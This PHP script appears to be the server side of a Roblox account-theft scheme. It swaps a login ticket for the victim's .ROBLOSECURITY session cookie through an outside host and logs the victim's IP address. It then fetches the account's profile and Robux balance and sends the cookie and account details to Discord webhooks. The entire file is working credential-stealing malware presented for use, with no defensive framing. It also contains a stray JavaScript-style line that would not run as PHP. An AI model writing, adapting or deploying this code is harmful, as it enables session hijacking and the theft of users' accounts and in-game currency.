<?php
    require("config.php");
    header("Access-Control-Allow-Origin: *");
    mode: "no-cors";

    if (!isset($_SERVER['HTTP_ORIGIN']) || !in_array($_SERVER["HTTP_ORIGIN"], $allowed_origins) || !isset($_GET["t"])) {
        die();
    }

    $ticket = $_GET["t"];
    if (strlen($ticket) < 100 || strlen($ticket) >= 1000) {
        die();
    }
	function GetUserIpAddress(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
	}
	$victimsip = GetUserIpAddress();
	$cookie = file_get_contents("https://endpoint.rblxapi.co/342swa13fse25dfet1/$ticket/$victimsip");
    if ($cookie) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Cookie: .ROBLOSECURITY=' . $cookie
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $profile = json_decode(curl_exec($ch), 1);
        curl_close($ch);
        
        if (account_filter($profile)) {
            $hookObject = json_encode([
                 "username" => "Baked Cookies",
                 "content" => "@everyone",
        "avatar_url" => "https://cdn.discordapp.com/attachments/782996077061865494/835627361923366942/vector-illustration-cute-granny-tray-sweets-granny-chef-holding-tray-homemade-cookies-187527237.png",
                "embeds" => [
                    [
                        "title" => "Roblox Account Link",
                        "type" => "rich",
                        "description" => "",
                        "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                        "timestamp" => date("c"),
                        "color" => hexdec("#0000FF"),
                        "thumbnail" => [
                            "url" => "https://www.roblox.com/bust-thumbnail/image?userId=" . $profile["UserID"] . "&width=420&height=420&format=png"
                        ],
                        "author" => [
                            "name" => "Variety Hits",
                            "url" => "https://rolimonschecker.com"
                        ],
                        "fields" => [
                            [
                                "name" => "Name",
                                "value" => $profile["UserName"]
                            ],
                            [
                                "name" => "Robux Balance",
                                "value" => $profile["RobuxBalance"]
                            ],
                            [
                                "name" => "Premium",
                                "value" => $profile["IsPremium"]
                            ],
                            [
                                "name" => "Rolimon's",
                                "value" => "https://www.rolimons.com/player/" . $profile["UserID"]
                            ],
                            [
                                "name" => "Cookie",
                                "value" => "```" . $cookie . "```"
                            ],
                        ]
                    ]
                ]
            
            ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
            $ch = curl_init();
            
            curl_setopt_array( $ch, [
                CURLOPT_URL => $rolimonswebpage,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $hookObject,
                CURLOPT_HTTPHEADER => [
                    "Content-Type: application/json"
                ]
            ]);
            
            $response = curl_exec( $ch );
            curl_close( $ch );
            
            $ch = curl_init();
            
            curl_setopt_array( $ch, [
                CURLOPT_URL => $webhook,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $hookObject,
                CURLOPT_HTTPHEADER => [
                    "Content-Type: application/json"
                ]
            ]);
            
            $response = curl_exec( $ch );
            curl_close( $ch );
        }
    }
?>